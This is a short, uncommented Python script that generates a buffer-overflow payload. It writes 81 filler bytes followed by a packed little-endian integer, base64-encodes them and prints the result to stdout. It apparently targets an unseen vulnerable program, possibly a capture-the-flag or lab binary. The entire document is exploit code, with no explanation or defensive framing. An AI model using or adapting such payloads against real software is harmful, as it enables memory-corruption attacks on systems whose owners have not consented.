
import sys
import struct
import base64

buf = b'nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn'
buf += struct.pack('<I', 217247777)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
